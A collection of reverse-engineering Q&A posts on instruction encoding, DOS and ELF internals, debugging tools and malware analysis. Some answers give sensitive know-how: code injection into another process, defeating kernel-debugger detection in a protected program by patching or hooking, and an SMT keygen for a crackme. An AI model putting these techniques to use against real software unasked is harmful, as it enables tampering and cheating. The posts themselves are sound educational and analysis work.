<p>variable with a <strong>positive</strong> offset is a <em>parameter to the function</em>, where a variable with a <strong>negative</strong> offset is usually a <em>local variable</em>. This is of course not always the case but you can take it as a general rule of thumb.</p>
","6253"
"Randomly picking up a x86 register for an instruction","556","","<p>I came around a piece of malware which i am analyzing and have found that it uses some kind of math to randomly selecting a register for a specific instruction</p>

<p>Which i don't understand how this operation is calculated depend on what?</p>

<p>Here is an example of what i mean</p>

<p>let's say that i wanted to randomly pick up a register for the instruction</p>

<pre><code>ADD DWORD PTR DS:[0],EAX
</code></pre>

<p>We know the opcode for this instruction is 01 <strong>05</strong> 00 00 00 00</p>

<p>The bold number represents the register for this instruction</p>

<p>05 == EAX
0D == ECX</p>

<p>To better explain this here is the instruction with all the registers</p>

<pre><code>0041580B    0105 00000000   ADD DWORD PTR DS:[0],EAX
00415811    010D 00000000   ADD DWORD PTR DS:[0],ECX
00415817    0115 00000000   ADD DWORD PTR DS:[0],EDX
0041581D    011D 00000000   ADD DWORD PTR DS:[0],EBX
00415823    0125 00000000   ADD DWORD PTR DS:[0],ESP
00415829    012D 00000000   ADD DWORD PTR DS:[0],EBP
0041582F    0135 00000000   ADD DWORD PTR DS:[0],ESI
00415835    013D 00000000   ADD DWORD PTR DS:[0],EDI
</code></pre>

<p>The malware uses a register index starting from 0 (EAX) till 7 (EDI)</p>

<p>The number is get SHLed first with the number 3 then it is ORed with 5 to get the right register opcode. So my question is how the author came to the conclusion of that?</p>

<p>I would say that SHL REG,3 equals REG*8 that is the number of max registers? but why do we need to OR it with 05? is it because the starting opcode of this instruction is 05?</p>

<p>Does anybody have a better explanation for this? or any hint words for a better comprehend?</p>
","<p>To better understand this, you need to study instruction encoding formats i.e. x86 for this question.</p>

<p>An x86 instruction looks like this</p>

<pre><code>+----------------------+--------+--------+-----+--------------+-----------+
| Instruction prefixes | Opcode | ModR/M | SIB | Displacement | Immediate |
+----------------------+--------+--------+-----+--------------+-----------+
|          0-4         |   1-3  |   0-1  | 0-1 |      0-4     |    0-4    |
+----------------------+--------+--------+-----+--------------+-----------+
</code></pre>

<p>The numbers on the second row indicates the length in bytes of the corresponding part.</p>

<p>For the instruction,</p>

<pre><code>010D 00000000   ADD DWORD PTR DS:[0],ECX
</code></pre>

<p>there is no instruction prefix.
The opcode for <code>ADD</code> is <code>01</code> (<a href=""http://x86.renejeschke.de/html/file_module_x86_id_5.html"" rel=""nofollow noreferrer"">Check here</a>)</p>

<p>The second byte of the instruction i.e <code>ModR/M</code>is <code>0D</code>.
The <code>ModR/M</code> byte provides addressing information about the instruction. It specifies whether an operand is in a register or in memory; if it is in memory, then fields within the byte specify the addressing mode to be used.</p>

<p>The <code>ModR/M</code> byte can be broken down into</p>

<pre><code>+-----+------------+-----+
| Mod | Reg/Opcode | R/M |
+-----+------------+-----+
|  2  |      3     |  3  |
+-----+------------+-----+
</code></pre>

<p>Here the numbers on the second row indicates the length in bits of the corresponding parts.</p>

<p>The <code>Mod</code> field (2 bits) combines with the <code>R/M</code> field (3 bits) to form 32 possible values 8 registers and 24 addressing modes.</p>

<p>The <code>Reg/Opcode</code> field (3 bits) specifies either a register number or three more bits of opcode information; the <code>r/m</code> field (3 bits) can specify a register as the location of an operand, or it can form part of the addressing-mode encoding in combination with the <code>Mod</code> field.</p>

<p>Now, convert the <code>ModR/M</code> i.e <code>0D</code> to binary. You would get.</p>

<pre><code>+-----+------------+-----+
| Mod | Reg/Opcode | R/M |
+-----+------------+-----+
|  00 |     001    | 101 |
+-----+------------+-----+
</code></pre>

<p>The <code>Mod</code> and <code>R/M</code> fields are <code>00</code> and <code>101</code> respectively. This indicates displacement only addressing mode. See the table below.</p>

<p><a href=""https://i.stack.imgur.com/mGqsS.png"" rel=""nofollow noreferrer""><img src=""https://i.stack.imgur.com/mGqsS.png"" alt=""enter image description here""></a> </p>

<p><strong>For all the instructions this mode of addressing is used, hence the reason for  <code>OR</code>ing with 5 (in binary 101) to set that particular bit pattern.</strong></p>

<p>Coming to the <code>Reg/Opcode</code> field, this indicates a register. 
<br><code>001</code> is the register index for <code>ECX</code>. </p>

<p>For the first instruction i.e
<br><code>0105 00000000   ADD DWORD PTR DS:[0],EAX</code> 
<br>this field is <code>000</code> standing for <code>EAX</code>. You can check by converting <code>05</code> to binary.</p>

<p>See more in the table below taken from <a href=""http://www.c-jump.com/CIS77/CPU/x86/X77_0060_mod_reg_r_m_byte.htm"" rel=""nofollow noreferrer"">here</a>.</p>

<p><a href=""https://i.stack.imgur.com/Ljow1.png"" rel=""nofollow noreferrer""><img src=""https://i.stack.imgur.com/Ljow1.png"" alt=""enter image description here""></a></p>

<p><strong>So basically the register value was <code>SHL</code>ed with 3 to move it to the correct position. The Reg/Opcode field is 3 bits from the right.</strong></p>

<p>Finally the last 4 bytes are <code>00000000</code>. This represents the displacement which is zero in this example.</p>
","12836"
"Where can I find benign samples with a high potential to false positive?","556","","<p>In the pursue and development of malware detection algorithms, often a big sample set of both malicious and benign samples is required. Both machine learning or similar automated techniques, as well as manual or partialy manual signature generation ofthen require a good and varied examples of benign samples that are commonly mistaken as malicious.</p>

<p>Those samples are usually being automatically analyzed and then provided to a Reverse Engineer for further scrutiny, analysis and improvement of said malware detection algorithms.</p>

<p>Although finding malicious samples is frequently discussed (see <a href=""https://reverseengineering.stackexchange.com/questions/206/where-can-i-as-an-individual-get-malware-samples-to-analyze"">multiple</a> <a href=""https://reverseengineering.stackexchange.com/questions/9279/where-can-i-get-linux-malware-samples"">questions</a>), discussion about benign sample sources seems lacking.</p>

<p>What are good benign sample repositories/feeds, preferably focused on potential/frequent false positive samples? Other sources or ""retrival methods"" (scraping) are also welcome! </p>
","<p>You can find some of the samples from our work on deobfuscation at hxxp:// www.cs.arizona.edu /projects /lynx-project /Samples/ (s/x/t/ and remove whitespaces).  The programs---a mix of Linux and Windows binaries---are all benign (you'll have to take my word for this :-), but use a variety of techniques commonly used by malware.  These samples formed the basis for the results reported in the following papers:</p>

<ul>
<li>Yadegari <em>et al</em>, ""A Generic Approach to Automatic Deobfuscation of Executable Code"", <em>Proc. IEEE Symposium on Security and Privacy</em>, May 2015.  These consist of programs obfuscated using tools such as VMProtect, ExeCryptor, and Themida; and several that use return-oriented programming.</li>
<li>Qiu <em>et al</em>, ""Identifying and Understanding Self-Checksumming Defenses in Software"", <em>Proc. Fifth ACM Conference on Data and Application Security and Privacy</em> (CODASPY), March 2015.  This is a collection of programs that use a variety of techniques, including self-modifying code, to implement self-checksumming-based anti-tampering.</li>
</ul>

<p>We used to have a link to these samples on the project web page, but Google decided that we were distributing malware and put a big red warning next to their link (talk about false positives!), so we ended up removing the link.  This is also the reason the link above has been disguised with ""hxxp"" and whitespace. :-)</p>
","13443"
"Binwalk and firmware of a sat receiver","553","","<p>i'm tried to gather information of firmware and extract the contain with binwalk on kali , when i scanned rom.bin , i have as result many lines 1-> most of lines are LZMA data compressed , but when i extract this data i can't open it. 2-> last line ""Mcrypte 2.2 , blofish crypted""</p>

<p>can some help me , what can i do to extract data correctly</p>

<p>here the firmware
<a href=""http://wikisend.com/download/396604/rom.bin"" rel=""nofollow"">http://wikisend.com/download/396604/rom.bin</a> <a href=""http://wikisend.com/download/194102/ChannelList.bin"" rel=""nofollow"">http://wikisend.com/download/194102/ChannelList.bin</a></p>

<p>thank you</p>
","<p>It's probably obfuscated:
<a href=""http://www.devttys0.com/2014/02/reversing-the-wrt120n-firmware-obfuscation/"" rel=""nofollow"">read more about an obfuscated firmware from WRT120N</a></p>

<p>I think that you should do hardware analysis in order to know how the firmware is unpacked...</p>
","8066"
"Any correlation between DOS Program Segment Prefix and the base address of loaded executable?","551","","<p>I'm using IDA to disassemble <a href=""http://www.myabandonware.com/game/test-drive-iii-the-passion-119"" rel=""nofollow"">Test Drive III</a>. It's a 1990 DOS game. The *.EXE has MZ format.</p>

<p>The game uses a number of anti-reversing features such as copying its code to segment <code>(PSPseg+2be7)</code> where <code>PSPseg</code> is the initial value of <code>ES</code> (i.e. the segment where PSP resides). As far as I know, <a href=""http://en.wikipedia.org/wiki/COM_file"" rel=""nofollow"">COM executables</a> are always loaded right after the end of <a href=""http://en.wikipedia.org/wiki/Program_Segment_Prefix"" rel=""nofollow""><code>Program Segment Prefix (PSP)</code></a>, so that both PSP and exe fit into one segment. What about MZ executables? Is there any fixed place where application's PSP is located relatively to the application itself?</p>

<p>In other words, is the <code>base-PSPseg</code> offset always the same? On my <a href=""http://www.dosbox.com/"" rel=""nofollow"">DOSBox</a> at the start of the program execution <code>CS</code> is always <code>0x22CF</code>, <code>ES=DS=0x01FE</code>, <code>CS0</code> in the MZ header is <code>0x20C1</code>, yielding <code>base-PSPseg</code> offset <code>0x0010</code> (16 segments, 256 bytes - exactly the size of PSP).</p>

<p>If this offset is not fixed and both PSP and the application are just loaded randomly in whatever memory location is big enough, then is there at least any guarantees about their addresses? Like that PSP address is always lower than the app's base address?</p>
","<p>DOS didn't have a concept of more than one application being able to run at the same time, with each of those applications able to allocate memory. Programs that stayed resident after termination weren't able to allocate more memory while another program was running. So, there was no fragmentation in memory, and no ""memory location that was big enough"".</p>

<p>The memory from 0x00000 was occupied by the interrupt vector table and various bios variables, DOS loaded behind them. The end of the memory block that was used by DOS depended on lots of factors, but whenever a program got loaded, the PSP was created at the lowest possible location, and the program loaded directly behind that. So, yes, you can rely on your program using the memory behind the PSP, and you can rely on the difference between your segment registers and the PSP being constant as well.</p>

<p>The PSP segment itself was unpredictable to programmers - stuff like the ansi.sys console driver, foreign keyboard drivers, the Cdrom drivers, and various stay-resident programs (anyone remember sidekick?) could increase the size of the ""dos block"" causing the PSP address of loaded programs to increase (and available memory to decrease). But as long as you don't change the configuration of your DOSBOX, you should be able to rely on the PSP - and your segment registers - being the same for each run of the program.</p>
","6054"
"Is it possible to (heuristic) identify the begin addr of main function in a stripped ELF?","551","","<p>So basically I am working on some tripped <em>dynamic linked</em> ELF binaries (32 bit Linux x86), using <code>objdump</code> to disassemble them, modifying and trying to reassemble them.</p>

<p>In the unstripped binary, we can get the beginning address of main function based on the symbol table, however, on the stripped binary, we just don't know where the main function is.</p>

<p>Of course I can just adjust the whole <em>text</em> section, and starting from the original entry point of the ELF.</p>

<p>But the problems are:</p>

<ol>
<li><p>There is some control transfer from the prologue/epilog of this ELF (such as <code>_start</code>; <code>__do_global_dtors_aux</code>; <code>__libc_csu_fini</code>; <code>__i686.get_pc_thunk.bx</code>; <code>__do_global_ctors_aux</code>) into the <code>.dtors</code>,<code>.ctors</code>section, which means I have to also disassemble this section.</p></li>
<li><p>I am afraid that if I start from entry point in the re-assembled ELF, then I would probably <strong>double-init</strong> some stuff, because in my re-assembled asm code, I have the code of <code>_start</code>; <code>__do_global_dtors_aux</code>; <code>__libc_csu_fini</code> while linker will also attach these functions in the new ELF.</p></li>
</ol>

<p>So I would like to use some way to identify the <code>main</code> function in a stripped ELF (heuristically)...</p>

<p>Right now I don't have some strategies on this issue, Could anyone give me some help?</p>
","<p>So I am thinking that, in the asm code disassembled from <code>objdump</code>, we should always find this :</p>

<pre><code>push addr
call __libc_start_main
</code></pre>

<p>and in a heuristical perspective, we can just consider the <code>addr</code> in the above code is the beginning addr of <code>main</code> function.</p>

<p>Am I right? Is there any exception?</p>
","4350"
"what does the imediate value of the BKPT opcode is being used for?","550","","<p>Assembler syntax
BKPT #
where:
 See Standard assembler syntax fields on page A6-7.
 Specifies an 8-bit value that is stored in the instruction. This value is ignored by the ARM 
hardware, but can be used by a debugger to store additional information about the 
breakpoint.</p>

<p>what should i pass to this function? where can i see that value when i am debugging? </p>

<p>BKPT #0  vs BKPT #1  - is their a difference? </p>
","<p>From <a href=""http://infocenter.arm.com/help/index.jsp?topic=/com.arm.doc.dui0552a/BABHCHGB.html"" rel=""nofollow"">http://infocenter.arm.com/help/index.jsp?topic=/com.arm.doc.dui0552a/BABHCHGB.html</a>:</p>

<blockquote>
  <p>Debug tools can use this to investigate system state when the
  instruction at a particular address is reached.</p>
  
  <p><code>imm</code> is ignored by the
  processor. If required, a debugger can use it to store additional
  information about the breakpoint.</p>

<pre><code>BKPT #0x3   ; Breakpoint with immediate value set to 0x3 (debugger can
            ; extract the immediate value by locating it using the PC)
</code></pre>
</blockquote>

<p>Based on what you pasted in your question, you can use any 8-bit value for <code>imm</code> for your ARM processor.</p>

<p>You can see the value of <code>imm</code> in your debugger by fetching the instruction at the <code>PC</code> (program counter) that caused the breakpoint and looking to see what value of <code>imm</code> was used in that instruction.</p>
","3996"
"How to break this reversing exercise","548","","<p>I have reversed the code of this simple crackme(more like reverseme :)) but I don't understand how to create valid password for the algorithm.
Here's the reversed code:</p>

<pre><code>#include &lt;stdlib.h&gt;
#include &lt;stdio.h&gt;
#include &lt;string.h&gt;

int main(int argc, char* argv[]) {
    if(argc&lt;2)
        return -1;

    char *original = argv[1]; 
    char *password = strdup(original);
    int success = 0xFD0970E7;
    int i, j;
    for (i = random() &amp; 0xFF; i &gt; 0; i--) {
        for (j = 0; j &lt; (int)strlen(original); j++) {
            password[j] = password[j] ^ random();
        }
    }

    i = 0x1337;
    for (j = strlen(original)-1; j &gt;= 0; j--) {
        i = i * password[j] + 0x31337;
    }

    if (i == success) {
        printf(""SUCCESS\n"");
        return 0;
    }

    printf(""WRONG\n"");
    return -1;
}
</code></pre>

<p>I understand that since random() isn't seeded I can control the input that gets to the later stages of the program, but I don't get how can I use it to solve it :(</p>
","<p>We can define recursive functions in SMT language (e.g. with <code>define-fun-rec</code>), but some popular solvers (e.g. <code>z3</code>) currently cannot handle them yet (I do not know any can support); so it is not direct to encode loops in such a solver. </p>

<p>But we can use a trick, that is to just unroll the loop (then it is still obliged to test several lengths of the password) by generating automatically SMT formulae. For example, the following program generate a SMT formula for each length of password:</p>

<pre><code>#include &lt;stdlib.h&gt;
#include &lt;stdio.h&gt;

#define PRE_VAL_NUM 0xfff
int ran_vals[PRE_VAL_NUM];

void gen_pre_vals()
{
  for (unsigned int i = 0; i &lt; PRE_VAL_NUM; ++i) {
    ran_vals[i] = random();
  }
  return;
}

int main(int argc, char* argv[])
{
  if (argc != 2) {
    printf(""please run as keygen length_of_password\n"");
    return 0;
  }

  gen_pre_vals();

  FILE* smt_file = fopen(""reverseme.smt2"", ""w+"");

  fprintf(smt_file, ""(set-logic QF_BV)\n"");
  fprintf(smt_file, ""(set-info :smt-lib-version 2.0)\n"");

  int passwd_len = strtol(argv[1], NULL, 0);

  fprintf(smt_file, ""\n"");
  for (int i = 0; i &lt; passwd_len; ++i) {
    fprintf(smt_file, ""(declare-fun pw%d () (_ BitVec 8))\n"", i);
  }
  fprintf(smt_file, ""\n"");
  fprintf(smt_file, ""(define-fun prev_i ((i (_ BitVec 32)) (pw_i (_ BitVec 8))) (_ BitVec 32)\n"");
  fprintf(smt_file, ""(let ((pw_i_ext ((_ sign_extend 24) pw_i)))\n"");
  fprintf(smt_file, ""(bvadd (bvmul i pw_i_ext) #x00031337)))\n"");

  fprintf(smt_file, ""\n"");
  for (int i = 0; i &lt; passwd_len; ++i) {
    fprintf(smt_file, ""(assert (and (bvuge pw%d #x21) (bvule pw%d #x7e)))\n"", i, i);
  }

  fprintf(smt_file, ""\n"");
  fprintf(smt_file, ""(assert\n"");
  fprintf(smt_file, ""(let (\n"");
  unsigned int acc_ran;
  for (int i = 0; i &lt; passwd_len; ++i) {
    acc_ran = 0x00;

    for (int j = ran_vals[0] &amp; 0xff; j &gt; 0; j--) {
      acc_ran ^= ran_vals[1 + i + (j - 1) * passwd_len];
    }

    fprintf(smt_file, ""(pwn%d (bvxor pw%d #x%x))\n"", i, i, (acc_ran &amp; 0xff));
  }
  fprintf(smt_file, "")\n"");
  fprintf(smt_file, ""(let ((i%d (prev_i #x1337 pwn%d)))\n"", passwd_len - 2, passwd_len - 1);
  for (int i = passwd_len - 2; i &gt;= 1; --i) {
    fprintf(smt_file, ""(let ((i%d (prev_i i%d pwn%d)))\n"", i - 1, i, i);
  }
  fprintf(smt_file, ""(let ((i (prev_i i0 pwn0)))\n"");
  fprintf(smt_file, ""(= i #xfd0970e7))\n"");
  for (int i = 0; i &lt; passwd_len; ++i) fprintf(smt_file, "")"");
  fprintf(smt_file, "")\n"");

  fprintf(smt_file, ""\n"");
  fprintf(smt_file, ""(check-sat)\n"");
  fprintf(smt_file, ""(get-value (\n"");
  for (int i = 0; i &lt; passwd_len; ++i) fprintf(smt_file, ""pw%d\n"", i);
  fprintf(smt_file, ""))\n"");

  fclose(smt_file);

  printf(""output smt file: reverseme.smt2\n"");

  return 1;
}
</code></pre>

<p>It generates a SMT file, named <code>reverseme.smt2</code> for each length of password (e.g. the generated SMT file for the length <code>6</code> is <a href=""http://rise4fun.com/Z3/Dcnb"" rel=""nofollow"">here</a>), then we can type: <code>z3 reverseme.smt2</code> to get a valid password. </p>

<p>I have tested for lengths of <code>2, 3, 4, 5</code> (the length <code>1</code> is obviously impossible). On my machine, <code>z3</code> takes about 1-5 seconds for each test, and gives <code>UNSAT</code> for each of them; the first <code>SAT</code> result ""6`SHQe"" (ASCII codes: <code>0x36, 0x60, 0x53, 0x48, 0x51, 0x65</code> is found for length of <code>6</code>. I do not check whether there exists some valid passwords for lengths larger than <code>6</code> though.</p>
","11322"
"Intel syntax - Meaning of jmp/call instruction with $+5 operand","546","","<p>I'm currently parsing a lot of assembly files and don't understand a specific <code>jmp</code> or <code>call</code> with <code>$+5</code> as operand:</p>

<pre><code>call $+5
 jmp $+5
</code></pre>

<p>To provide more context I grepped some of the occurrences:</p>

<pre><code>mov esp, [ebp+ms_exc.old_esp]
and [ebp+ms_exc.registration.TryLevel], 0
or [ebp+ms_exc.registration.TryLevel], 0FFFFFFFFh
call $+5
jmp sub_4493CA
===== S U B R O U T I N E =======================================
push esi

[...]

mov esp, [ebp+ms_exc.old_esp]
and [ebp+ms_exc.registration.TryLevel], 0
or [ebp+ms_exc.registration.TryLevel], 0FFFFFFFFh
call $+5
jmp sub_45746A
===== S U B R O U T I N E =======================================
mov eax, dword_4778F8

[...]

mov eax, ebx
test al, 2
jnz loc_100994B8
jmp $+5
-----------------------------------------------------------------
mov eax, [ebp+var_34]
mov [ebp+var_40], eax
</code></pre>

<p>What is the meaning of the <code>$+5</code> operand?</p>
","<p>opcode for call $+5 is e8 00000000 so it calls the next instruction<br>
opcode for jmp  $+5 is e9 00000000 so it jumps to the next insturction</p>

<pre><code>76E95FE0                        E8 00000000 CALL    76E95FE5         ;  &lt;ntdll.call here&gt;
76E95FE5 &lt;ntdll.call here&gt;      00          DB      00
76E95FE6                        E9 00000000 JMP     76E95FEB         ;  &lt;ntdll.jmp_here&gt;
76E95FEB &lt;ntdll.jmp_here&gt;       00          DB      00
76E95FEC                        EB 02       JMP     SHORT 76E95FF0   ;  &lt;ntdll.jmp+4&gt;
76E95FEE                        00          DB      00
76E95FEF                        00          DB      00
76E95FF0 &lt;ntdll.jmp+4&gt;          00          DB      00
</code></pre>
","13372"
"Call function of injected dll","545","","<p>I am messing around with dll injections. I am able to inject a dll with an exported function into some process, but I have a question now:</p>

<p>Is there a standard way to call the exported function of my injected dll?</p>

<p>I can provide code if necessary.</p>
","<p>I am not sure if I understood correctly, but if you mean calling the exported function from the binary which just got injected the DLL, then do this:</p>

<pre><code>auto hLib = GetModuleHandleA(""your_library.dll"");
auto fn = GetProcAddress(hLib, ""exported_function_name"");

// supposing your function is declared as:
// extern ""C"" __declspec(dllexport) int __cdecl fn() { ... }
((int(__cdecl*)(void)) fn)();
</code></pre>

<p>You might have to check which calling convention your compiler used for the function, though (if you didn't specify any).</p>

<hr>

<p><strong>Edit</strong>: since you want to call the function from the injector rather than the injected binary, you should do something like this:</p>

<ol>
<li>Use <code>VirtualAllocEx</code> to alloc some bytes in the target process</li>
<li><p>Use <code>WriteProcessMemory</code> to write shellcode on the target process</p>

<ul>
<li><p>You will need to write something like this:</p>

<pre><code>mov eax, 0x0BADC0DE ; the offset of your function
call eax
</code></pre></li>
<li><p>You can use <a href=""https://defuse.ca/online-x86-assembler.htm"" rel=""nofollow"">this online service</a> to generate the shellcode.</p></li>
</ul></li>
<li><p>Use <code>CreateRemoteThread</code> to run a thread on the shellcode</p></li>
</ol>

<p>Also, be aware that games usually have anti-cheat systems, and they detect this kind of behaviour (it's quite common).</p>

<hr>

<p>But apart from all of this: you could inject your DLL with <code>VirtualAllocEx</code> -> <code>WriteProcessMemory</code> -> <code>LoadLibrary</code> | <code>CreateRemoteThread</code>, and have Windows call your DLL's <code>DllMain</code> instead of you doing it yourself.</p>
","13675"
"Has anyone tried ptrace_attaching android unity apps for anti debugging?","544","","<p>I am trying to <code>ptrace_attach</code> the main process and its threads (<code>/proc/&lt;pid&gt;/task</code>) of an android unity app to avoid malicious users debugging the app(which is a game). </p>

<p>I developed a ndk library that forks from main process and <code>ptrace_attach</code> the parent process(being the main process) inside the <code>JNI_OnLoad()</code> function. After that periodically checks the <code>/proc/&lt;pid&gt;/task</code> folder to attach newly created threads. </p>

<p>The problem is, 
this works well in normal apps but when I try to run this inside an app made with unity, the main process stops and screen becomes black or white not responding. But if you delay attaching a few seconds just enough to see the animation working on the screen, attaching works fine.</p>

<p>Code is roughly something like this:</p>

<pre><code>if(!fork())
{
     parentPid = getppid();

     // attach parent process
     if(ptrace(PTRACE_ATTACH,parentPid,0,0)&lt;0)
          exit(-1);
     ptrace(PTRACE_SETOPTIONS, parentPid, 0, PTRACE_O_TRACEEXEC| PTRACE_O_TRACEVFORKDONE|PTRACE_O_TRACESYSGOOD |PTRACE_O_TRACEFORK |PTRACE_O_TRACEVFORK |PTRACE_O_TRACECLONE );

     while(true)
     {
          // get signal from processes
          stoppedPid = waitpid(-1,&amp;stat_loc, 0);

          ...

          // check if stoppedPid need to be attached
          // if so, attach
          ptrace(PTRACE_ATTACH,stoppedPid,0,0);

          ...

          // else, just continue the stopped process
          ptrace(PTRACE_CONT,stoppedPid,0,0);
     }
 }
</code></pre>

<p>Maybe I should adjust the <code>ptrace_setoptions</code> ?</p>

<p>Thanks in advance :)</p>
","<p>Well somethings I found out - </p>

<p>When I <code>ptrace_attach</code> the main process of the target app and wait for signals, 
I get SIGSEGV signal while app loads and just hangs there(because forked process cannot handle SIGSEGV). In the java code, it seems SIGSEGV occurs while calling View related functions. </p>

<p>I guess UnityPlayer or Android app loader handles SIGSEGV smoothly while app loading time. Therefore, if you get a SIGSEGV, simply detaching it and attaching again does not hang the app. </p>
","12998"
"Anti-kernelmode functions (specifically zwquerysysteminformation)","542","","<p>I'm working on a program that has lots of checks, and I've decided to start by disabling their anti-kernel mode, as it'd surely be more easy to isolate than normal anti-debugging. After poking around a little, I found that <code>ntdll.zwquerysysteminformation</code> runs in a loop in the main thread called by several <code>.vmp</code> addresses. Since I <strong>can't make memory changes, even in DLLs</strong> (or debug it normally), I was thinking about setting up kernel mode breakpoints until I have a bit more to go off of, but to do that, I'd need the offset from the base structure containing the byte. Microsoft doesn't seem to provide this, so would anyone happen to know? Or maybe have general pointers on getting past kernel mode detection in obfuscated targets? I know this is pretty broad, but I'm pretty sure they'd only have used the most basic of methods.</p>
","<p>I think the check you're talking about (<code>NtQuerySystemInformation</code> with <code>SystemKernelDebuggerInformation</code>) simply checks <code>KdDebuggerEnabled</code> and <code>KdDebuggerNotPresent</code> under the hood (both are single bytes exported from <code>ntoskrnl.exe</code>). You could simply patch those two to get past that particular check. Alternatively, you could go for hooking NtQuerySystemInformation either in usermode (you've mentioned that you can't make memory changes, but that's usually not true - if a memory change at some location is detected, then make the change somewhere else) or in kernelmode (requiring a PatchGuard bypass on 64-bit systems).</p>

<p>However, your kernel debugger might still be detected by its window/driver name.</p>
","8972"
"Debugging with radare2 using two terminals","542","","<p>I have been trying to figure this out for quite some time now, and would really need some help. Firstly, some intro:</p>

<p>I am running the newest version of radare2 from Github on a 64bit Ubuntu 16.04 and have the following sample program <code>r2_test.cpp</code>:</p>

<pre><code>#include &lt;cstdio&gt;

int main(int argc, char* argv[])
{
    int num;

    while (1)
    {
        printf(""Enter a number: "");
        scanf(""%d"", &amp;num);
        printf(""You entered: %d\n"", num);
    }

    return 0;
}
</code></pre>

<p>What I am trying to achieve is to debug this program using radare2 and two terminals in a way that I run radare2 in terminal window <code>T1</code> and have the programs input/output in terminal window <code>T2</code>. After some research I figured that this should probably be done with the help of <code>rarun2</code> tool. </p>

<p>So, for my first try I read the <a href=""https://github.com/radare/radare2/blob/master/man/rarun2.1#L139"" rel=""noreferrer"">man page</a> for rarun2, specifically the part with redirecting IO to another terminal and after identifying the <code>T2</code> terminal as <code>/dev/pts/17</code> I created the following <code>test.rr2</code> file:</p>

<pre><code>#!/usr/bin/rarun2
stdio=/dev/pts/17
</code></pre>

<p>In <code>T2</code> terminal I've then run <code>sleep 999999</code> and in terminal <code>T1</code> I run <code>r2 -R test.rr2 -d a.out</code> and when executing the command <code>dc</code> inside radare2, the programs input/output is in terminal <code>T1</code> which is not what I wanted. I've also tried variations like making <code>test.rr2</code> equal </p>

<pre><code>#!/usr/bin/rarun2
stdin=/dev/pts/17
stdout=/dev/pts/17
</code></pre>

<p>or</p>

<pre><code>#!/usr/bin/rarun2
stdio=/dev/pts/17
stdin=/dev/pts/17
stdout=/dev/pts/17
</code></pre>

<p>but the result was always the same.</p>

<p>For my second try, after some research and reading, I tried running the radare2 in the following way: <code>r2 -d rarun2 program=a.out stdio=/dev/pts/17</code>. With this I've achieved redirecting the IO to terminal <code>T2</code>, but the process which gets debugged inside radare2 is the rarun2 tool and since my knowledge of Linux and reverse engineering on it is not that good, I don't really know how to proceed to debugging the <code>a.out</code> process.</p>

<p>So, to summarize, I would really appreciate if someone could share here if this kind of debugging can be done with radare2 and, if it can, how to achieve it? I've also tried it with using <code>nc</code>, but I haven't made any progress to this topic with it.</p>
","<p>It is actually very simple and works for me just fine as you can see in the following gif:</p>

<p><img src=""https://i.imgur.com/LqrnYRP.gif"" alt=""Direct link""></p>

<hr>

<p>First you need to figure out the <code>tty</code> of the terminal you want to redirect the <code>STDIO</code> to (a.k.a Terminal 2, <em>T2</em>).
You can do this  by simply execute:</p>

<pre><code>$ tty
/dev/pts/2
</code></pre>

<p>This <code>tty</code> will soon be used on the <code>rarun2</code> profile file.
Meantime, let's put <em>T2</em> to sleep by using <code>sleep 999999</code>.  </p>

<p>Moving to <em>Terminal 1</em>, let's create a simple <code>rarun2</code> profile with the following content:</p>

<pre><code>#!/usr/bin/rarun2
stdio=/dev/pts/2
</code></pre>

<p>We configured <code>stdio</code> to transfer the <em>standard input and output</em> to <em>T2</em>.
Now let's execute our program with the profile we've just created:</p>

<pre><code>$ r2 -e dbg.profile=profile.rr2 -d a.out  
Process with PID 14074 started...
= attach 14074 14074
bin.baddr 0x00400000
Using 0x400000
Assuming filepath /tmp/re/a.out
asm.bits 64
 -- Mind that the 'g' in radare is silent
[0x7f9654e0fd80]&gt;
</code></pre>

<p>(<em>The same can be done using:</em> <code>r2 -R profile.rr2 -d a.out</code>)<br>
The program successfully loaded in debug mode. Now just for the example, let's put a <em>breakpoint</em> on the second call to <code>printf</code> and start the program using <code>dc</code>. In the <em>gif</em> I was not creating a breakpoint.</p>

<pre><code>[0x7f9654e0fd80]&gt; db 0x00400580
[0x7f9654e0fd80]&gt; dc
Selecting and continuing: 14074
</code></pre>

<p>Now <em>T2</em> gives us the output and asks for our input:</p>

<pre><code>Enter a number:
</code></pre>

<p>After we send it a digit our breakpoint on <em>T1</em> hit:</p>

<pre><code>hit breakpoint at: 400580
[0x00400580]&gt;
</code></pre>

<p>We can now continue the execution using <code>dc</code>, the loop would continue forever and the Standard Input and Output will be in T2.</p>
","16430"
"What is the benefit or reason of using a static disassembler over a dynamic disassembler in terms of malware analysis?","542","","<p>I know that </p>

<blockquote>
  <p>Dynamic program analysis is the analysis of computer software that
  is performed by executing programs on a real or virtual processor.</p>
</blockquote>

<p>while</p>

<blockquote>
  <p>Static program analysis is the analysis of computer software that is
  performed without actually executing programs</p>
</blockquote>

<p>But what i don't understand is that why would someone use a static disassembler like ida pro over a dynamic disassembler or debugger like ollydbg and vice versa.</p>

<p>P.S This is not a duplicate of 
<a href=""https://reverseengineering.stackexchange.com/questions/3473/what-is-the-difference-between-static-disassembly-and-dynamic-disassembly"">What is the difference between static disassembly and dynamic disassembly?</a></p>

<p>Because this is not asking for the difference but it is asking for the reason and benefits why someone would choose static disassembler over a dynamic disassembler and vice versa in terms of malware analysis. </p>
","<p>In most cases, you won't confine yourself to one of them, instead, you'll use both.</p>

<p>Dynamic analysis means running the software. You don't want to do this with a piece of software that you suspect of being malware, except in a controlled environment. </p>

<p>Also, before running the software, you want to know a bit about it. Is the executable packed in some way? Does it use anti-debugging techniques? Does the software contain any pieces of some well-known / open source library? There are lots of tools out there that answer some of these questions - Ida pro is only one of them.</p>

<p>To further improve your understanding of the software, you want a tool that helps you find dependencies between its parts. Which parts of the binary are actually code, and which are data? If the software contains strings, or other data, that looks interesting, where are those referenced? Which function is called where? This is where the cross-referencing of IDA comes in handy.</p>

<p>On the other hand, in many cases, you don't really need to understand every single instruction of a subroutine to know what it does. You might want to know which files and which registry keys get read and written by your software. Or, you might want to know if it accesses the internet, and which sites it connects to. Running the software with stuff like <code>procmon</code> or <code>wireshark</code> enabled is the fastest way to find out - i'd consider that dynamic analysis as well, even though <code>procmon</code> and <code>wireshark</code> aren't debuggers. Or, while analyzing your software, you come across a function that contains lots of bit operations - this might be some kind of encryption or hashing. Fire up a debugger, set breakpoints on the function, and check its parameters and return values. This can confirm your assumption much faster than trying to understand the function.</p>

